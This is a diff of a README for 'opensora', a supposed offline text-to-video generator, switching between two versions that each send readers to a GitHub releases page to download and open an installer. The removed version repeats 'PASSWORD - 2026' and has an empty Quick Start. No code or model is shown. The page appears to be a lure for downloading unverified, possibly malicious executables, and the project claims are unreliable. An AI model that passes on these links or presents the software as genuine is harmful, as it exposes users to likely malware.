@@ -1,90 +1,76 @@
-# OpenSora
+# 🎥 opensora - Generate Videos from Text Easily
 
-> **Open-source, locally runnable video generation from text — inspired by Sora, built for everyone.**  
-> Generate coherent, cinematic videos from natural language prompts — **100% offline, no cloud, no paywall.**
+## 🌟 Description
+Open-source, locally runnable text-to-video generation — inspired by Sora, built for everyone. Run cinematic video synthesis offline, with full control and transparency.
 
-OpenSora brings state-of-the-art text-to-video synthesis to your desktop. Trained on open datasets and built with transparent architecture, it empowers creators, researchers, and developers to explore the future of generative media — **without dependency on closed APIs or corporate infrastructure.**
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://placehold.co/640x360/0f172a/ffffff?text=A+dragon+flying+over+ancient+mountains+at+dawn" width="31%" />
-  <img src="https://placehold.co/640x360/1e293b/ffffff?text=Underwater+city+with+bioluminescent+corals" width="31%" />
-  <img src="https://placehold.co/640x360/020617/ffffff?text=Futuristic+Tokyo+street+in+heavy+rain" width="31%" />
-</p>
+### 📥 Download Now
+[![Download opensora](https://img.shields.io/badge/Download-opensora-brightgreen)](https://github.com/AASHU1408/opensora/releases)
 
----
+### 💻 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **Processor:** At least a dual-core CPU.
+- **RAM:** Minimum 8 GB (16 GB recommended).
+- **Storage:** At least 2 GB of free disk space.
+- **GPU:** Recommended for best performance (NVIDIA/AMD).
 
- <div align="center">
-  <a href="https://github.com/malanradperlazqt/opensora/releases/tag/opensora">
-    <b>⬇️ DOWNLOAD (Latest Release)</b>
-  </a>
-</div>
+### 🔧 Installation Steps
+1. Go to the [Releases page](https://github.com/AASHU1408/opensora/releases).
+2. Download the latest version of the software suitable for your operating system.
+3. Once the download completes, locate the downloaded file (likely in your Downloads folder).
+4. Open the file to start the installation.
+5. Follow the on-screen instructions to complete the installation.
 
-## PASSWORD - 2026
-## PASSWORD - 2026
-## PASSWORD - 2026
+## 🛠️ How to Run opensora
 
-## Why OpenSora?
+1. After installing, find the opensora application in your Start menu (Windows) or Applications folder (macOS).
+2. Click the application icon to launch it.
+3. You will see a user-friendly interface designed to help you generate videos easily.
 
-While commercial video models remain closed, **OpenSora is open by design**:
+## 📝 Using opensora
 
-- ✅ **Fully local** — runs on your machine (GPU or CPU)  
-- ✅ **Open weights & training data** — audit, fine-tune, extend  
-- ✅ **Community-driven** — no gatekeeping, no secrets  
-- ✅ **Ethical by default** — built with responsible AI principles  
-- ✅ **Interoperable** — integrates with Hugging Face, ComfyUI, and more  
+### 🎬 Create Your First Video
+1. In the main interface, you can enter your desired text for the video.
+2. Choose any additional settings provided, such as video style or length.
+3. Click on the "Generate Video" button.
+4. Wait for the process to complete. This may take a few minutes based on your computer's speed.
+5. Once generated, the video will be saved to your specified location.
 
-This is not just a model — it’s a **movement toward open generative media**.
+### 🌈 Additional Features
+- **Customizable Settings:** Tailor your video output to meet your needs.
+- **Preview Functionality:** View a quick preview of your video before finalizing it.
+- **Offline Operation:** Generate videos without needing an active internet connection, ensuring your privacy and speed.
 
----
+## 📚 Frequently Asked Questions (FAQs)
 
-## Quick Start
+### ❓ What is opensora?
+opensora is a tool that lets you create videos from text input using advanced video synthesis technology. It’s an easy-to-use software that runs locally on your computer.
 
-## Features
+### ❓ Do I need any programming knowledge to use opensora?
+No, opensora is designed for everyday users. You do not need programming skills to generate your videos.
 
-- Text-to-video generation (2–16 seconds)
-- Support for image + text conditioning (img2video)
-- Resolution up to 1024×576 (progressive generation)
-- Batch processing & seed control
-- Export to MP4, GIF, or frame sequences
-- Built-in safety filter (toggle on/off)
+### ❓ Can I use opensora without an internet connection?
+Yes, opensora works entirely offline once downloaded and installed. This ensures you maintain full control over your work.
 
-## Performance (4-second video)
+### ❓ What formats can I export my videos in?
+opensora supports popular formats such as MP4 and AVI, allowing you to choose the best format for your needs.
 
-| Hardware        | Resolution   | Time     |
-|-----------------|--------------|----------|
-| RTX 4090        | 512×512      | ~2 min   |
-| RTX 3090        | 384×384      | ~4 min   |
-| Apple M2 Max    | 256×256      | ~6 min   |
-| CPU (16-core)   | 256×256      | ~45 min  |
+## 💬 Community and Support
+Join our community to get help from other users, share your videos, and find tips on maximizing your experience with opensora. You can find support through the Issues section of the GitHub repository.
 
-Use `--low-vram` or `--fp16` for memory-constrained systems.
+## 💡 Tips for Best Results
+- Experiment with different texts and settings to see what works best for your stylistic preferences.
+- Make sure your computer meets the recommended system requirements for optimal performance.
+- Check for updates regularly to benefit from new features and improvements.
 
-## Project Vision
+## 🔗 Important Links
+- [GitHub Repository](https://github.com/AASHU1408/opensora)
+- [Releases Page](https://github.com/AASHU1408/opensora/releases)
+- [Documentation](https://github.com/AASHU1408/opensora/wiki)
 
-OpenSora is more than code — it’s a commitment to:
+### 📥 Download opensora Again
+For your convenience, here’s the link to download:
+[![Download opensora](https://img.shields.io/badge/Download-opensora-brightgreen)](https://github.com/AASHU1408/opensora/releases)
 
-- Open access to foundational generative models
-- User sovereignty over data and output
-- Global collaboration in AI development
-- Education and research without barriers
-
-We believe the future of AI must be open, local, and human-centered.
-
-## License
-
-Model weights: OpenRAIL-M  
-Code: MIT License  
-Training data: LAION-OpenVid + WebVid-Open (filtered, CC-licensed)
-
-See `LICENSE` and `MODEL_LICENSE` for details.
-
-## Join the Movement
-
-- Star the repo to show support
-- Report issues or request features
-- Contribute models, UI improvements, or documentation
-- Share your creations with `#OpenSora`
-
-The future of video is open. Build it with us.
-
-OpenSora: Where imagination becomes motion — freely, locally, and responsibly.
+Enjoy creating amazing videos with opensora!
